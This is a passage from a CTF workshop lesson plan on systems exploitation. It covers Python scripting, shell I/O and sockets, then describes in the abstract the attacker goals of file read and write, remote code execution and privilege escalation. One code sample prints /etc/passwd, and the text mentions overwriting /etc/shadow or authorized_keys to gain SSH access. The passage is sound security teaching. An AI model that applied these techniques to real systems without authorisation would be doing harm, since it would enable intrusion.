#ctf101 Systems 2016 Lesson Plan

## Assumptions

We assume that participants have the following pre-requisite knowledge:

1. Basic programming in any scripting language
2. Some elementary familiarity with C
3. The tools and ability to ssh into their provided shell accounts given out the
previous day

## Topics to Cover

0. Approach
1. Overview of Systems Exploitation
2. Offensive Python 101
3. Input/Output
4. Types of Compromise
5. Illustration of Compromise in Target Python Applications
6. C and x86-64 Assembly
7. Memory Layout
8. Stack Frames
9. Debuggers
10. Memory Corruption Vulnerabilities
11. Mitigations and Bypasses
12. Conclusions and Additional Challenges

## 0. Approach

In this session, we shift our focus from web technologies to systems
applications. These refer to applications that run 'natively' on your machines
or on remote machines. For example, programs like calc.exe or /bin/ls fall under
the category of systems applications. We will be learning how to delve deep into
the inner workings of these programs, discovering vulnerabilities, and
exploiting these vulnerabilities to achieve a compromise objective.

We will take an extremely incremental approach to the lesson where our approach
to the vulnerability discovery and exploit writing process is applied to easy
to understand vulnerable Python scripts before tackling compiled binaries that
require the extra step of reverse engineering of x86-64 assembly and an
understanding of memory layout.

It is hoped that by the end of the workshop, participants will have the required
knowledge of the tools and skills needed to further progress onto more advanced
topics in the reverse engineering and exploitation of systems applications.

Please do refer to this lesson plan for all code snippets and references as the
lesson progresses.

## 1. Overview of Systems Exploitation

Systems security is an extremely large domain. Basically, anything that runs on
a system, local or remote, is considered a systems application. Typically, the
primary target we look at in systems security are 'binaries'. These are compiled
applications that run natively on the processor of the machine. These binaries
could have been written in a variety of languages such as Golang or OCaml, but
most are probably written in C or C++. The important point to note here is that
obtaining an understanding of what the program does is not as simple as opening
the file in a text editor and hoping for the source code to appear. The result
is literally a 'binary' mess.

What is to be done then is to transform the raw native bytecode that make up the
binary into something understandable by a human. In this workshop, we will look
at turning the bytecode into x86-64 assembly in a process called disassembly.
The mapping between the raw bytecode and x86-64 instructions is sufficiently
close enough to understand what happens to the processor during program
execution. We will go further in depth into assembly language later on.

Vulnerabilities in these binaries come in two flavours: memory corruption and
logic vulnerabilties. Memory corruption vulnerabilties typically stem from a bug
in the code that provides a vector for an attacker to corrupt regions of memory
in such a way that the new values cause unintended consequences during program
execution. Logic vulnerabilities cause unintended consequences directly as a
result of faulty programming logic.

Interpreted programs such as ruby scripts or compiled Java bytecode also fall
under our domain. However, they primarily only contain logic vulnerabilities
(there might be extremely esoteric counterexamples, though).

We will craft our exploit code in the python language. Hopefully most of you are
already familiar with it but we will begin with a short crash course on the
language and required features of it.

## 2. Offensive Python 101

The following code snippets assume the shell environment you have been given
during the previous session.

### Working with Python

There are three ways to work with python:

1. The Interpreter
2. A Script
3. Through the Argument

#### The Interpreter

To launch an interactive interpreter, you can simply run the `python` command in
the terminal.

```console
elliot@ctf101-shell:~/ctf101$ python
Python 2.7.12 (default, Jul  1 2016, 15:12:24)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>
```

Now, you may interact with the python interpreter by typing python statements
and pressing enter to evaluate the statement immediately.

```console
elliot@ctf101-shell:~/ctf101$ python
Python 2.7.12 (default, Jul  1 2016, 15:12:24)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 1 + 41
42
>>> print "Here's looking at you, " + "kid."
Here's looking at you, kid.
>>> bin(1337)
'0b10100111001'
>>>
```

This is extremely useful when prototyping your exploits since you can get
feedback about what is happening in real time by exploring python objects.

```console
>>> people = "Soylent Green is people!"
>>> dir(people)
['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__',
'__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__',
'__getslice__', '__gt__', '__hash__', '__init__', '__le__', '__len__', '__lt__',
'__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__',
'__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__',
'__subclasshook__', '_formatter_field_name_split', '_formatter_parser',
'capitalize', 'center', 'count', 'decode', 'encode', 'endswith', 'expandtabs',
'find', 'format', 'index', 'isalnum', 'isalpha', 'isdigit', 'islower',
'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip',
'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit',
'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title',
'translate', 'upper', 'zfill']
>>> people.upper()
'SOYLENT GREEN IS PEOPLE!'
>>>
```

However, we want to do something better. We now exit from the python interpreter
by typing `exit()` and launch the iPython interpreter. This upgraded interpreter
has quality of life improvements such colourised output, tab completion, and
object introspection. To launch it type `ipython`:

```console
>>> exit()
elliot@ctf101-shell:~/ctf101$ ipython
Python 2.7.12 (default, Jul  1 2016, 15:12:24)
Type "copyright", "credits" or "license" for more information.

IPython 2.4.1 -- An enhanced Interactive Python.
?         -> Introduction and overview of IPython's features.
%quickref -> Quick reference.
help      -> Python's own help system.
object?   -> Details about 'object', use 'object??' for extra details.

In [1]: import md5

In [2]: md5.
md5.blocksize    md5.digest_size  md5.md5          md5.new          md5.warnings

In [2]: hashed = md5.md5("password")

In [3]: hashed.
hashed.block_size   hashed.digest       hashed.digestsize   hashed.name
hashed.copy         hashed.digest_size  hashed.hexdigest    hashed.update

In [3]: hashed.hexdigest()
Out[3]: '5f4dcc3b5aa765d61d8327deb882cf99'

In [4]:
```

#### A Script

Typing so much all the time is not very useful for actual work though and we can
place our python programs in scripts. Launch your favourite text editor and
create the following [program](./lessonfiles/offensivepython/1-sample.py) as
`sample.py`:

```python
#!/usr/bin/python

def main():
    name = raw_input("Name: ")
    print "Your name is", name

if __name__ == "__main__":
    main()
```

Run the script by entering `python sample.py` in the terminal.

```console
elliot@ctf101-shell:~/ctf101$ python sample.py
Name: Mr Robot
Your name is Mr Robot
elliot@ctf101-shell:~/ctf101$
```

#### Through the Argument

Sometimes if what we need to do is terse enough to do in a single line of
python, we may opt to pass the python code as an argument to the python program.
This lets us create nifty one liners for use in terminal trickery.

```console
elliot@ctf101-shell:~/ctf101$ python -c 'print "Clone\n"*10'
Clone
Clone
Clone
Clone
Clone
Clone
Clone
Clone
Clone
Clone

elliot@ctf101-shell:~/ctf101$
```

Why would you use this option? For example, you might want to get something
quick and easy output for piping into another program.

```console
elliot@ctf101-shell:~/ctf101$ python -c 'print "MrRobot"*42' | md5sum
827eae4fb606cf49ccaf8fc6b65cfdae  -
```

### Language syntax

We will go through a quick run through of the Python syntax you need to know for
our purposes.

#### Script Skeleton

Use the following template as a base for all python scripts:

```python
#!/usr/bin/python

def main():
    pass    # Code goes in here

if __name__ == "__main__":
    main()
```

The reason we do this is to keep our code neat and structured by ensuring all
functions and global variables are defined before we use them as python
interprets each line sequentially.

#### Whitespace

If you have not already noticed, python is extremely sensitive to whitespace.
This allows the language to do away with braces or start-end sigils by
implicitly determining the scope of a particular piece of code by the
indentation level.

```python
#!/usr/bin/python

# This runs at the global scope.
alpha = 1

def main():
    # This runs at the scope of main()
    beta = 2

    if beta == 2:
        # This runs if the conditional is true
        charlie = 3
    else:
        # This runs if the conditional is false
        charlie = 4

if __name__ == "__main__":
    main()
```

Make sure to not mix tabs and spaces for indentation as python will complain
about it.

#### Variables

You have already seen this but let us expand on this a little further. Python is
a dynamically typed language which means there is no requirement to declare the
type of a variable while writing your script. Objects do have types, however.
Think of the variable as a generic 'reference' to these typed objects.

```python
#!/usr/bin/python

# Creating a 'global' variable
var_global = 1337

def main():
    # Creating a variable that holds an integer
    var_one = 54321

    # Creating two variables that hold strings
    var_two = "I am a string"
    var_three = 'I too am a string, even though my quotes are single'

    # Creating a list object
    var_four = []

    # Creating a dict object
    var_five = {}

    # Creating a tuple object with two integers
    var_six = (41, 42)

    # Creating a file object from /etc/passwd
    var_seven = open("/etc/passwd")

    # Printing the contents of the file object by referencing a method
    print var_seven.read()



if __name__ == "__main__":
    main()
```

#### Conditionals

Conditionals allow for branching logic in a program and are an integral part of
every programming language. Here is how they look like in python:

```python
#!/usr/bin/python

def main():
    # if else conditionals are extremely important
    if True:
        # This definitely gets printed.
        print "I passed"
    else:
        # This never gets printed.
        print "I failed"

    current_year = 2016

    # Conditionals over variables
    if current_year > 2020:
        print "It's the future!"
    elif current_year == 2016:
        print "Come on, it's the CURRENT_YEAR!"
    else:
        print "Absolutely stone age"

    # This is not extremely important but demonstrates conditionals in list
    # comprehensions
    multiples_of_two = [i for i in range(16) if i % 2 == 0]
    print multiples_of_two


if __name__ == "__main__":
    main()
```

#### Loops

There are your traditional for and while loops in python:

```python
#!/usr/bin/python

import random

def main():
    # range() produces a list of numbers
    print range(10)
    # should produce [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]

    # We use this in for loops to create our indexed for loops
    for i in range(10):
        print "This number is", i

    # If you have not already realised the for loop is actually a for-each loop
    travellers = ["Morty", "Rick", "Summer"]
    for i in travellers:
        if i is not "Summer":
            print i, ", you are are allowed to travel in time."
        else:
            print "Go away, Summer."

    # There are also while loops
    counter = 0
    while counter < 10:
        counter += random.randint(0, 5)  # Add a random integer to the counter
        print counter

    # Do while loops do not exist but can be approximated
    while True:
        counter = counter - 1
        if counter < 0:
            print "Stopped!"
            break

if __name__ == "__main__":
    main()
```

And there exists also a convenient feature of python called list comprehensions.
Please do not worry if the following is hard to follow:

```python
#!/usr/bin/python

def main():
    # This might look like magic but it is basically a loop within a list
    mults_of_two = [i*2 for i in range(100)]

    # This allows us to create some really useful transformations
    fruits = ["apple", "orange", "mango", "blueberries"]
    fruit_lengths = [len(i) for i in fruits]

    # We can even make it look like an indexed loop
    fruit_output = ["%s (%d)" % (fruits[i], fruit_lengths[i]) for i in
                    range(len(fruits))]

    # Insert newlines in between the fruit outputs and print the entire string
    print "\n".join(fruit_output)

if __name__ == "__main__":
    main()
```

#### List and String Slicing

Lists are straightforward and creating sublists is extremely easy with slices.

```python
#!/usr/bin/python

def main():
    # We create a list of numbers
    numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]

    # Slices let you create sublists from an original list
    # Syntax for slices look like: list[start_including:stop_excluding:step]
    one_to_three = numbers[1:4]  # Remember we exclude the last index

    print one_to_three  # Results in [1, 2, 3]

    # We can also omit arguments to signify either a from start or to end
    zero_to_four = numbers[:5]
    seven_to_nine = numbers[7:]

    print zero_to_four  # Results in [0, 1, 2, 3, 4]
    print seven_to_nine  # Results in [7, 8, 9]

    # We can skip numbers by providing a step
    twos = numbers[::2]
    threes = numbers[::3]

    print twos  # Results in [0, 2, 4, 6, 8]
    print threes # Results in [0, 3, 6, 9]

    # We can also reverse the list
    rev_numbers = numbers[::-1]

    print rev_numbers  # Results in [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]

if __name__ == "__main__":
    main()
```

Strings also work with slices to create substrings.

```python
#!/usr/bin/python

def main():
    # The cake is a lie
    birthday_party = "The cake is a lie"

    cake = birthday_party[4:8]
    print cake  # Result is cake

    reverse = birthday_party[::-1]
    print reverse  # Result is eil a si ekac ehT

if __name__ == "__main__":
    main()
```

#### String Operations and Encoding

Some important string operations make for fast writing of exploits with how
convenient they are to use.

```python
#!/usr/bin/python

def main():
    users = "admin:passwd chrome:metal emacs:vims"

    # We can do string splits by spaces
    users_split = users.split()

    print users_split
    # Result is ['admin:passwd', 'chrome:metal', 'emacs:vims']

    # We can also split strings by an arbitrary string sequence
    for i in users_split:
        creds_split = i.split(":")
        print "Username:", creds_split[0], "Password:", creds_split[1]

    # Get only the usernames
    usernames = [i.split(":")[0] for i in users_split]

    # Join the usernames with a comma
    commaed = ", ".join(usernames)

    print commaed  # Results in admin, chrome, emacs

    # I cannot speel
    cantspell = "Faaling, Paaling, Faat, Graat, Laaks"

    # You can replace substrings within strings
    canspell = cantspell.replace("aa", "ee")

    print canspell  # Results in Feeling, Peeling, Feet, Greet, Leeks

    # You can call methods directly on strings as well
    print "shout".upper()  # Results in SHOUT

if __name__ == "__main__":
    main()
```

Here are some encodings and transformations that might be useful:

```python
#!/usr/bin/python

def main():
    sample_number = 65

    # We can get binary representations for a number
    print bin(sample_number)  # Results in 0b1000001

    # We can also get hex representations for a number:
    print hex(sample_number)  # Results in 0x41

    # Also, octal:
    print oct(sample_number)  # Results in 0101

    sample_text = "ABCD"

    # Often, we want to convert a string into hex for reason that will be more
    # apparent as you progress further up in CTFs

    print sample_text.encode("hex")  # Results in 41424344

    # Conversely, we can also decode from a hex string

    print "41424344".decode("hex")  # Results in ABCD

    # There are other useful codecs as well:

    print "SGVsbG8=".decode("base64")  # Results in Hello
    print "Obawbhe".decode("rot13")  # Results in Bonjour


if __name__ == "__main__":
    main()
```

#### Functions

Finally, we come to functions which allow you to organise your program a lot
better.

```python
#!/usr/bin/python

def alone():
    print "I am alone."

def feed(food):
    print "I am fed", food

def add(a, b):
    return a + b

def main():
    # We can call a function with no parameters
    alone()

    # Or we can call it with a parameter
    feed("tacos")

    # Functions can be nested
    print add(add(1, 2), 3)

if __name__ == "__main__":
    main()
```

### Important Modules

Throughout the workshop, we will introduce important python modules as we
require. Modules are external 'libraries' that we import for use in our scripts.
We use the syntax `import <modulename>` to import a module.

## 3. Input/Output

Every interesting program requires some interaction with the user. Input/output
mechanisms give us this means of interaction and often, I/O sources are the very
first place to look at when trying to figure out how to cause a crash from user
supplied input.

We will look at the following sources of I/O:

1. Arguments
2. Standard Streams
3. Files
4. Sockets
5. Environment Variables

### Arguments

The first way a program may take input is through its arguments. Let us use the
ping command as an example.

```console
elliot@ctf101-shell:~$ ping -h
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
```

The help argument (-h) tells the ping command to print the available options for
arguments. In this case, the destination to ping is required as an argument.

```console
elliot@ctf101-shell:~$ ping google.com
PING google.com (74.125.200.138) 56(84) bytes of data.
64 bytes from sa-in-f138.1e.net (74.125.200.138): icmp_seq=1 ttl=50 time=3.15 ms
64 bytes from sa-in-f138.1e.net (74.125.200.138): icmp_seq=2 ttl=50 time=2.96 ms
64 bytes from sa-in-f138.1e.net (74.125.200.138): icmp_seq=3 ttl=50 time=3.10 ms
^C
--- google.com ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 2.969/3.079/3.159/0.080 ms
elliot@ctf101-shell:~$
```

Sometimes you want to provide spaces within an argument. For example, you want
to create one file called "cool file" but when you try it by using the touch
program, two files called 'cool' and 'file' are created instead.

```console
elliot@ctf101-shell:~/myfiles$ touch cool file
elliot@ctf101-shell:~/myfiles$ ls -la
total 8
drwxr-xr-x 2 elliot ctf101 4096 Aug 18 18:37 .
drwxr-xr-x 4 elliot ctf101 4096 Aug 18 18:37 ..
-rw-r--r-- 1 elliot ctf101    0 Aug 18 18:37 cool
-rw-r--r-- 1 elliot ctf101    0 Aug 18 18:37 file
elliot@ctf101-shell:~/myfiles$
```

We can remedy this by using quotes to treat whatever is in between them as a
single argument to the program.

```console
elliot@ctf101-shell:~/myfiles$ touch 'cool file'
elliot@ctf101-shell:~/myfiles$ ls -la
total 8
drwxr-xr-x 2 elliot ctf101 4096 Aug 18 18:38 .
drwxr-xr-x 4 elliot ctf101 4096 Aug 18 18:37 ..
-rw-r--r-- 1 elliot ctf101    0 Aug 18 18:38 cool file
elliot@ctf101-shell:~/myfiles$
```

Now, let us consider the situation where you would like to programmatically
compute the argument instead of giving the program a static argument each time.
Perhaps, in this scenario you would like to rename the file to the md5 hash of
its contents. We can employ the use of backticks (`) in bash to achieve this.

```console
elliot@ctf101-shell:~/myfiles$ ls -la 'cool file'
-rw-r--r-- 1 elliot ctf101 0 Aug 18 18:38 cool file
elliot@ctf101-shell:~/myfiles$ md5sum 'cool file' | cut -c -32
d41d8cd98f00b204e9800998ecf8427e
elliot@ctf101-shell:~/myfiles$ mv 'cool file' `md5sum 'cool file' | cut -c -32`
elliot@ctf101-shell:~/myfiles$ ls -la
total 8
drwxr-xr-x 2 elliot ctf101 4096 Aug 18 18:50 .
drwxr-xr-x 4 elliot ctf101 4096 Aug 18 18:37 ..
-rw-r--r-- 1 elliot ctf101    0 Aug 18 18:38 d41d8cd98f00b204e9800998ecf8427e
elliot@ctf101-shell:~/myfiles$
```

What if we want to execute a program through a python script? We can make use of
either the `os` or `subprocess` modules to perform this. Let's take a look at
the os module first:

```python
#!/usr/bin/python

#import the os
import os

def main():
    # We can run shell commands by using os.system('shell command')
    # This is the equivalent of running sh -c '<your command here>' so things
    # like pipes, redirects, semicolons work.

    # /usb/bin/md5sum is the program to execute
    # /etc/issue.net is the first argument to the program
    os.system("/usr/bin/md5sum /etc/issue.net")

    # Let's demonstrate that the features of the shell is available to us.
    os.system("echo 'Hello, Friend' > badfile; cat badfile")

if __name__ == "__main__":
    main()
```

The `os.system()` function is basically a wrapper to run shell commands. There
is a big distinction to running a program within a shell and without as we will
see when we use the subprocess module instead. Running the program yields:

```console
elliot@ctf101-shell:~/ctf101$ python argumentsos.py
f0ee0388ebfa8223e795491cb38a3081  /etc/issue.net
Hello, Friend
```

Checking that the file indeed exists within the current directory now:

```console
elliot@ctf101-shell:~/ctf101$ ls -la badfile
total 20
-rw-r--r-- 1 elliot ctf101   14 Aug 19 06:38 badfile
elliot@ctf101-shell:~/ctf101$
```

Now, let us use the `subprocess` module.

```python
#!/usr/bin/python

# import the subprocess module
import subprocess

def main():
    # With subprocess, you no longer have a shell environment since the program
    # is called directly instead of your commands being wrapped for execution
    # in a shell. The subprocess.call() function takes a list of strings where
    # the first string is the path to the program to execute and the following
    # strings the arguments to the program.

    # /usb/bin/md5sum is the program to execute
    # /etc/issue.net is the first argument to the program
    subprocess.call(["/usr/bin/md5sum", "/etc/issue.net"])


if __name__ == "__main__":
    main()
```

The special symbols that meant various things within the shell such as pipes,
backticks, redirections now are just passed directly to the program instead of
interpreted by the shell and will do nothing. Executing the python script:

```console
elliot@ctf101-shell:~/ctf101$ python argumentsubprocess.py
f0ee0388ebfa8223e795491cb38a3081  /etc/issue.net
```
### Standard Streams

Another method of interacting with the user is through the standard streams:
`stdin`, `stdout`, and `stderr`. The stdin and stdout stream should be familiar
to you. Reading from `stdin` gets the input the user provides and writing to
`stdout` prints information back to the user. `stderr` provides a means for
programs to output debugging or error information without polluting the `stdout`
stream.

Remember the python interpreter we interacted with?

```console
elliot@ctf101-shell:~/ctf101$ python
Python 2.7.12 (default, Jul  1 2016, 15:12:24)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> "this is me sending data to the python program through stdin"
'this is me sending data to the python program through stdin'
>>>
```

We 'send' data through `stdin` to the program by typing in our shell and in turn
the program 'sends' data through `stdout` to us by printing it in our shell.

What about `stderr`? Error messages such as the following are written to
`stderr`:

```console
elliot@ctf101-shell:~/ctf101$ ls -la /root
ls: cannot open directory '/root': Permission denied
```

How do you tell? First, we have to introduce the concept of pipes and stream
redirection. Often you would like for programs to interact with each other. You
have seen examples of this in some of the previous code snippets. Imagine
running a program and getting some output:

```console
elliot@ctf101-shell:~/ctf101$ python -c 'print "A"*24'
AAAAAAAAAAAAAAAAAAAAAAAA
elliot@ctf101-shell:~/ctf101$
```

Now, we could copy the output by hand manually and paste it into another program
as a way to transfer this information. However, there is a better way. We can
join the `stdout` of the `python` program to the `stdin` of another program, say
`base64`. This is called 'piping' the output of our first program into the input
of a second program. The special symbol we use to do this is called the 'pipe'
(|).

```console
elliot@ctf101-shell:~/ctf101$ python -c 'print "A"*24' | base64
QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBCg==
elliot@ctf101-shell:~/ctf101$
```

We can even chain more pipes to connect the output of `base64` to `md5sum`.

```console
elliot@ctf101-shell:~/ctf101$ python -c 'print "A"*24' | base64 | md5sum
2aafa255bcb4d626dba2804faf55a16a  -
elliot@ctf101-shell:~/ctf101$
```

What if we want to redirect the output of a stream to another stream? We can do
this by using stream redirection. Going back to the `stderr` example, we can
make the output disappear by redirecting what comes out on `stderr` to the
special `/dev/null` device that ignores what is fed into it.

```console
elliot@ctf101-shell:~/ctf101$ ls -la /root
ls: cannot open directory '/root': Permission denied
elliot@ctf101-shell:~/ctf101$ ls -la /root 2>/dev/null
elliot@ctf101-shell:~/ctf101$ ls -la /root 1>/dev/null
ls: cannot open directory '/root': Permission denied
```

Take note that the streams are given file descriptor numbers. 0 is `stdin`, 1 is
`stdout`, and 2 is `stderr`. So when we do `2>/dev/null` it makes the `stderr`
output go into the `/dev/null` device and disappear. Let us look at an example
with `grep`.

```console
elliot@ctf101-shell:~/ctf101$ echo "hello world" | grep -c hello
1
elliot@ctf101-shell:~/ctf101$ echo "hello world" | grep -c goodbye
0
elliot@ctf101-shell:~/ctf101$
```

`grep` is a program that searches the input for the the string given in the
argument and if it matches, it outputs the number of matched occurences (due to
us applying the `-c` argument). Let us try this out on the `stderr` example.

```console
elliot@ctf101-shell:~/ctf101$ ls -la /root
ls: cannot open directory '/root': Permission denied
elliot@ctf101-shell:~/ctf101$ ls -la /root | grep -c denied
ls: cannot open directory '/root': Permission denied
0
elliot@ctf101-shell:~/ctf101$
```

Notice that the error message is still printed out and the word denied is not
matched. If we redirect `stderr` to `stdout`, and grep for the word, it changes.

```console
elliot@ctf101-shell:~/ctf101$ ls -la /root 2>&1 | grep -c denied
1
elliot@ctf101-shell:~/ctf101$
```

Note that `&1` refers to the file descriptor 1 which is `stdout`.

Remember our explorations with calling programs with python in the previous
section? What if we want to interact with our programs from that? The answer is
obviously manipulating these streams.

```python
#!/usr/bin/python

import subprocess

def main():
    # Let's try and emulate echo "hello" | base64

    # We can't use the old method of subprocess.call anymore. We would have to
    # deal a little closer to the metal with subprocess.Popen.

    # Note the way we instantiate the object. We have to let the constructor
    # know that we want to interact with the stdin and stdout streams otherwise
    # it would go to the shell instead of our script.
    process = subprocess.Popen("/usr/bin/base64",
                               stdin=subprocess.PIPE,
                               stdout=subprocess.PIPE)

    # We need to write hello into the process' stdin stream
    process.stdin.write("hello")

    # Close the stream to let the program know we're done
    process.stdin.close()

    # We can now retrieve the output from stdout
    output = process.stdout.read()

    # Finally, let's print the output
    print output

if __name__ == "__main__":
    main()
```

Running the application:

```console
elliot@ctf101-shell:~/ctf101$ python streams.py
aGVsbG8=

elliot@ctf101-shell:~/ctf101$
```

### Files

Some programs take filenames as arguments. The simplest of them is the `cat`
command which reads the file and prints the file contents to `stdout`.

```console
elliot@ctf101-shell:~/ctf101$ cat /etc/issue.net
Ubuntu 16.04.1 LTS
elliot@ctf101-shell:~/ctf101$
```

With bash, you can also redirect the output of program to a file with the `>`
symbol.

```console
elliot@ctf101-shell:~/ctf101$ echo "Contents of this file" > thisfile
elliot@ctf101-shell:~/ctf101$ cat thisfile
Contents of this file
elliot@ctf101-shell:~/ctf101$
```

You can also read files into the `stdin` of a program with the opposite symbol
`<`.

```console
elliot@ctf101-shell:~/ctf101$ base64 < thisfile
Q29udGVudHMgb2YgdGhpcyBmaWxlCg==
elliot@ctf101-shell:~/ctf101$
```

In python, you can create, write to, and read from files as well.

```python
#!/usr/bin/python

def main():
    # Let's create a file
    towrite = open("my_file", "w")  # 'w' stands for open for write

    # Now, we can write a string into it
    towrite.write("some string")

    # Close the file
    towrite.close()

    # We can do the converse option by reading the file
    toread = open("my_file")  # implicitly open for read

    # Read the contents
    contents = toread.read()
    print contents

    # Close the file
    toread.close()

if __name__ == "__main__":
    main()
```

Running the script:

```console
elliot@ctf101-shell:~/ctf101$ python files.py
some string
elliot@ctf101-shell:~/ctf101$
```

### Sockets

The majority of the exercises we will be going through involve interacting with
a service hosted on a different system. That is, we will be looking at obtaining
access to a remote system. First, we need to learn how to even begin connecting
to such a remote service. Netcat is an extremely useful command line tool that
lets you create arbitrary TCP or UDP sockets.

Obviously we know that web pages are served over the network but can we manually
obtain the home page of http://codesinverse.com? We can with netcat!

```console
elliot@ctf101-shell:~/ctf101$ nc codesinverse.com 80
GET / HTTP/1.0

HTTP/1.1 200 OK
Date: Fri, 19 Aug 2016 11:20:30 GMT
Server: Apache/2.2.14 (Ubuntu)
Last-Modified: Sun, 27 Oct 2013 11:52:27 GMT
ETag: "3d01208-ed-4e9b79e1054c0"
Accept-Ranges: bytes
Content-Length: 237
Vary: Accept-Encoding
Connection: close
Content-Type: text/html

<head>
  <title>Codes^-1</title>
</head>
<body>
  <br />
  <br />
  <br />
  <div align="center">
    <h1>Q29kZXNpbnZlcnNlIGlzIHVuZGVyIGNvbnN0cnVjdGlvbiE=</h1>
    <h2>Smoke me a kipper, I'll be back for breakfast.</h2>
  </div>
</body>
elliot@ctf101-shell:~/ctf101$
```

Often, when you play in a CTF, the challenge description might contain something
like `nc pwn.spro.ink 1337`. Why not try it out?

```console
elliot@ctf101-shell:~/ctf101$ nc pwn.spro.ink 1337
What is your name? Elliot Alderson
Welcome Elliot Alderson, here's your flag: ctf101{1st_Fl4g_0f_th3_d4y!}
elliot@ctf101-shell:~/ctf101$
```

We can script this in python as well.

```python
#!/usr/bin/python

import socket

def main():
    # Create a socket
    sock = socket.socket()

    # Connect the socket to the remote service
    sock.connect(("pwn.spro.ink", 1337))

    # Receive the first prompt
    prompt = sock.recv(1024)  # Receive an arbitrary max 1024 bytes
    print prompt

    # Send our name
    sock.send("Elliot Alderson\n")  # Remember the newline at the end

    # Receive the flag
    flagline = sock.recv(1024)

    print flagline

if __name__ == "__main__":
    main()
```

Running the script:

```console
elliot@ctf101-shell:~/ctf101$ python sockets.py
What is your name?
Welcome Elliot Alderson, here's your flag: ctf101{1st_Fl4g_0f_th3_d4y!}

elliot@ctf101-shell:~/ctf101$
```

### Environment Variables

Environment variables are a set of key-value pairs that can affect the way
programs run. They form the dynamic environment a process runs in. We can dump
the existing environment variables by using the `env` command.

```
elliot@ctf101-shell:~/ctf101$ env
LC_PAPER=en_SG.UTF-8
LC_ADDRESS=en_SG.UTF-8
XDG_SESSION_ID=5
LC_MONETARY=en_SG.UTF-8
SHELL=/bin/bash
TERM=xterm-256color
SSH_TTY=/dev/pts/1
USER=elliot
LC_TELEPHONE=en_SG.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
MAIL=/var/mail/elliot
LC_IDENTIFICATION=en_SG.UTF-8
PWD=/home/elliot/ctf101
LANG=en_US.UTF-8
LC_MEASUREMENT=en_SG.UTF-8
HOME=/home/elliot
LOGNAME=elliot
SSH_CONNECTION=58.182.72.227 46670 128.199.201.65 22
LESSOPEN=| /usr/bin/lesspipe %s
XDG_RUNTIME_DIR=/run/user/0
LC_TIME=en_SG.UTF-8
LESSCLOSE=/usr/bin/lesspipe %s %s
LC_NAME=en_SG.UTF-8
_=/usr/bin/env
OLDPWD=/home/elliot
elliot@ctf101-shell:~/ctf101$
```

Some programs access the environment variables and modify their behaviour based
on what is available.

We can set environment variables temporarily for the duration of the terminal
session by using `export`. We can expand environment variables in the shell by
prefixing `$`.

```console
elliot@ctf101-shell:~/ctf101$ export MYFLAG=mrrobot
elliot@ctf101-shell:~/ctf101$ echo $MYFLAG
mrrobot
elliot@ctf101-shell:~/ctf101$
```

That covers most of what you need to know about input/output for today. Let us
move on to the actual security stuff from this point on.


## 4. Types of Compromise

Keep in mind that we are still dealing with extremely high level and abstract
concepts at this point of the workshop. Some of the high level goals of an
attacker include the following (in ascending order of severity and control):

1. Denial of Service
2. Information Leakage
3. Arbitrary File Read
4. Arbitrary File Write
5. Remote Code Execution
6. Privilege Escalation

### Denial of Service

Denial of Service vulnerabilities are broad and can be categorised as
destructive or non-destructive. The common theme between them is that they
obstruct and prevent legitimate users from accessing a service or resource.
While Denial of Service attacks can be caused by congestion of network
resources, we focus more on the vulnerabilties that exist inherently in the
application logic.

The most common denial of service conditions come from the program behind the
service crashing due to an exception such a segmentation fault. Another possible
reason why a service might not be responsive is because a particular resource
(such as memory) might be exhausted. This is evident when people launch fork
bombs in a shell.

### Information Leakage

An information leak (infoleak, for short) is a vulnerability that, when
exploited, reveals privileged information about the system or application to an
attacker. The effects of this information being in the control of an attacker
can be varying. Information an attack might be interested in include:

- Password Hashes
- Source Code
- Binaries
- Pointers and Addresses
- libc Shared Object

While infoleaks are not typically dangerous by themselves, they are used in
conjunction with another vulnerability to obtain more control over a system. We
distinguish this class with 'Arbitrary File Read' by restricting ourselves to
application specific features such as pointers that may exist in memory.

### Arbitrary File Read

Arbitrary file read vulnerabilities allow the attacker to retrieve any file that
the owner of the service has access to. The severity of an arbitrary file read
vulnerability varies based on the type of information granted to the attacker.
If SSH keys are left lying around, this vulnerability may as well be a remote
code execution one.

### Arbitrary File Write

Arbitrary file write vulnerabilties allow an attacker to create/overwrite files
on the file system with controlled content. Now, this is dangerous on multiple
levels. If the application is privileged and is capable of overwriting system
files such as /etc/shadow, /etc/passwd or even a user file such as
~/.ssh/authorized\_keys, an attacker may grant themselves access over SSH. If
the application is not privileged, but has write access to their own
directories, an attacker may insert content to perform arbitrary code execution.

An example of arbitrary code execution often appears when exploiting PHP web
applications where arbitrary PHP code is written to the file system and
triggered by the attacker when they surf to the location of the newly created
file.

### Remote Code Execution

Certain vulnerabilities grant arbitrary code execution which allows an attacker
to coerce the system into performing any operation she wishes. This may manifest
as a result of injection of evaluated data such as shell commands or scripts, or
on a more fundamental level such as taking control of the instruction pointer to
execute your own machine code. Arbitrary code execution is very closely tied to
privilege escalation where hijacking the control flow of a binary with
privileged access results in granting these privileges to the attacker.

### Privilege Escalation

Privilege escalation vulnerabilities can exist in multiple forms and are not
necessarily arbitrary code execution bugs. They often are though. These
vulnerabilties, when exploited result in the attacker obtaining higher level
rights such as administrator or root.

At a more advanced level, there exists vulnerabilities within the kernel of the
